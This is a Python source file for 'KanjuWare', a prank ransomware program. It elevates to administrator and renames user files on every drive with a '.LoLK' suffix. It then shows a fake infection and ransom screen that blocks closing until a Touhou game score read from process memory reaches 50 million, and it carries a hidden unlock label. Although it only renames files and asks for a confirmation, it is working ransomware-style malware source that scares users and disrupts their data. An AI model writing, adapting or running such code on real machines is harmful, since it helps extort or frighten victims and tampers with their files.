import ctypes
import errno
import os
import sys
import time
import threading
import tkinter as tk
from tkinter import messagebox
from pymem import Pymem

# ==================== Configuration ====================
TARGET_SCORE = 5000000
SCORE_ADDRESS = 0x004E40BC
TARGET_EXTENSION = ".LoLK"
TEST_DIR = "./test_files"
ALLOWED_EXTENSIONS = {
    ".pdf", ".txt", ".md", ".py", ".json", ".doc", ".docx",
    ".ppt", ".pptx", ".xls", ".xlsx",
    ".jpg", ".jpeg", ".png",
    ".mp3", ".m4a", ".aac", ".flac", ".alac", ".wav", ".mid",
    ".mp4", ".mov", ".mkv", ".flv",
    ".zip", ".rar",
}
# =======================================================

class KanjuWareApp:
    def __init__(self, root):
        self.root = root
        self.root.title("KanjuWare v1.1 - Pure Mutation")
        self.root.geometry("500x400")
        self.root.resizable(False, False)
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # State variables
        self.current_score = tk.StringVar(value="0")
        self.status_text = tk.StringVar(value="Initializing Pure Mutation...")
        self.is_unlocked = False
        
        self.setup_ui()
        self.backend_thread = threading.Thread(target=self.backend_worker, daemon=True)
        self.backend_thread.start()
        
        self.root.after(100, self.update_loop)

    def setup_ui(self):
            self.root.configure(bg="#1a1a2e")
            
            title_label = tk.Label(
                self.root, 
                text="【WARNING】Your computer has been infected!", 
                font=("Consolas", 14, "bold"), 
                fg="#ff4757", bg="#1a1a2e"
            )
            title_label.pack(pady=15)
            
            instruction_text = (
                "Oops, your file has been infected by \"Pure Mutation\"!\n\n"
                "What the HELL is it?\n"
                "The mutation has caused your precious data to be encrypted, including "
                "documents, images, music, and some project files. Only this program can "
                "recover the files, because the files have been \"encrypted\" using a "
                "\"high-strength encryption algorithm with a random key.\"\n\n"
                "How can I recover my file?\n"
                "That's easy, you just need to reach 50 million points in any difficulty "
                "in the \"Touhou Kanjuden Trial\" version, and this program will automatically "
                "detect the process and score of \"Touhou Kanjuden Trial\". If you do not "
                "want to lose your encryption key, do not attempt to deceive or close this program."
            )
            
            msg_label = tk.Label(
                self.root, text=instruction_text, 
                font=("Consolas", 9), 
                fg="#ffffff", bg="#1a1a2e", justify="left",
                wraplength=440
            )
            msg_label.pack(pady=5, padx=30)
            
            score_frame = tk.Frame(self.root, bg="#16213e", bd=2, relief="groove")
            score_frame.pack(pady=15, fill="x", padx=40)
            
            status_label = tk.Label(
                score_frame, textvariable=self.status_text, 
                font=("Microsoft YaHei", 9, "italic"), fg="#eccc68", bg="#16213e"
            )
            status_label.pack(pady=3)
            
            score_label = tk.Label(
                score_frame, text="Current Score in Memory:", 
                font=("Consolas", 10), fg="#ffffff", bg="#16213e"
            )
            score_label.pack(side="left", padx=20, pady=5)
            
            score_val = tk.Label(
                score_frame, textvariable=self.current_score, 
                font=("Consolas", 14, "bold"), fg="#2ed573", bg="#16213e"
            )
            score_val.pack(side="right", padx=20, pady=5)

            # Backdoor. Double-click the invisible label to trigger cheat unlock (for testing and emergency recovery)
            backdoor_btn = tk.Label(self.root, text=".", fg="#1a1a2e", bg="#1a1a2e")
            backdoor_btn.pack(side="bottom", anchor="se")
            backdoor_btn.bind("<Double-Button-1>", self.cheat_unlock)

    def _safe_rename(self, old_path, new_path):
        if not os.path.exists(old_path) or os.path.exists(new_path):
            return False
        try:
            if not os.access(old_path, os.W_OK):
                return False
            os.rename(old_path, new_path)
            return True
        except (PermissionError, OSError):
            return False

    def infect_files(self):
        self.status_text.set("Pure mutation is being launched (scanning all files...)")
        
        if not os.path.exists(TEST_DIR):
            try: os.makedirs(TEST_DIR)
            except: pass
            
        count = 0
        for drive_letter in range(ord("A"), ord("Z") + 1):
            drive = f"{chr(drive_letter)}:/"
            if not os.path.exists(drive):
                continue
            # Skipping system-sensitive directories to avoid critical damage and improve speed. Only targeting user files with allowed extensions.
            for root_path, dirs, files in os.walk(drive):
                if "Windows" in root_path or "Program Files" in root_path or "AppData" in root_path:
                    continue
                for file in files:
                    lower_ext = os.path.splitext(file)[1].lower()
                    if lower_ext in ALLOWED_EXTENSIONS and not file.endswith(TARGET_EXTENSION):
                        old_path = os.path.join(root_path, file)
                        new_path = old_path + TARGET_EXTENSION
                        if self._safe_rename(old_path, new_path):
                            count += 1
        print(f"[Pure Mutation] Successfully marked {count} files with {TARGET_EXTENSION}")

    def decrypt_files(self):
        self.status_text.set("Attempting to decrypt files...")
        count = 0
        for drive_letter in range(ord("A"), ord("Z") + 1):
            drive = f"{chr(drive_letter)}:/"
            if not os.path.exists(drive):
                continue
            for root_path, _, files in os.walk(drive):
                for file in files:
                    if file.endswith(TARGET_EXTENSION):
                        old_path = os.path.join(root_path, file)
                        new_path = old_path[:-len(TARGET_EXTENSION)]
                        if self._safe_rename(old_path, new_path):
                            count += 1
        print(f"[Decryption] Mutation has been lifted, successfully restored {count} files.")

    def backend_worker(self):
            self.infect_files()

            ADDR_TRIAL = 0x004E40BC
            ADDR_FULL  = 0x004E740C

            while not self.is_unlocked:
                try:
                    pm = Pymem("th15.exe")
                    self.status_text.set("Successfully locked th15.exe")
                    
                    active_address = None
                    
                    while not self.is_unlocked:
                        try:
                            if active_address is None:
                                score_trial = pm.read_int(ADDR_TRIAL)
                                score_full  = pm.read_int(ADDR_FULL)
                                
                                if score_full > 0:
                                    active_address = ADDR_FULL
                                    print("[Version Detected] Full Version locked.")
                                elif score_trial > 0:
                                    active_address = ADDR_TRIAL
                                    print("[Version Detected] Trial Version locked.")
                                
                                current_raw_score = score_trial if score_trial > 0 else score_full
                            else:
                                current_raw_score = pm.read_int(active_address)
                            
                            self.current_score.set(f"{current_raw_score}0")
                            
                            if current_raw_score >= TARGET_SCORE:
                                self.is_unlocked = True
                                self.status_text.set("Score has reached the target! Awakening files...")
                                break
                        except Exception:
                            self.status_text.set("Game connection lost, waiting again...")
                            self.current_score.set("0")
                            active_address = None
                            break
                        time.sleep(0.2)
                except Exception:
                    self.status_text.set("Waiting for Touhou Kanjuden to start (th15.exe)...")
                    self.current_score.set("0")
                    time.sleep(1.0)

    def update_loop(self):
        if self.is_unlocked:
            self.decrypt_files()
            messagebox.showinfo("Decryption Complete", "Congratulations! You have successfully reached 50 million points in Touhou Kanjuden ~ Legacy of Lunatic Kingdom. All files have been restored.")
            self.root.destroy()
            sys.exit(0)
        else:
            self.root.after(100, self.update_loop)

    def cheat_unlock(self, event):
        print("[Backdoor] You've triggered the cheat unlock! This is for testing and emergency recovery purposes. Files will be decrypted without reaching the target score.")
        self.is_unlocked = True

    def on_closing(self):
        if self.is_unlocked:
            self.root.destroy()
        else:
            messagebox.showwarning("Wanna to escape?", "Unless you complete the 50 million divisions, closing the window will not be useful (the file will not be restored).")

def is_running_as_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def relaunch_as_admin():
    if sys.platform != "win32":
        return False
    script = os.path.abspath(sys.argv[0])
    params = " ".join(f'"{arg}"' for arg in sys.argv[1:])
    try:
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
        return result > 32
    except Exception:
        return False

# ==================== Entrance ====================
if __name__ == "__main__":
    if not is_running_as_admin():
        if relaunch_as_admin():
            sys.exit(0)
        else:
            ctypes.windll.user32.MessageBoxW(
                None,
                "The program requires administrator privileges to correctly detect th15.exe and access files. Please run again as an administrator.",
                "Need Administrator Privileges",
                0x10,
            )

    root = tk.Tk()
    root.withdraw()
    start_confirmation = messagebox.askyesno(
        "Start Warning",
        "Warning: Although this prank software is not actually very destructive, many unsuspecting individuals may still be frightened by it. To avoid causing serious harm or loss, please follow the steps below to perform a self-check: \n\n1. You are aware of the software's operational characteristics. \n2. You are certain that you can reverse all impacts caused by this software. \n\nIf you meet the criteria outlined in the self-check steps above, you may click \"Yes\" to proceed with the challenge. Otherwise, please click \"No\" directly and permanently delete the software.",
    )
    if not start_confirmation:
        root.destroy()
        sys.exit(0)

    root.deiconify()
    app = KanjuWareApp(root)
    root.mainloop()
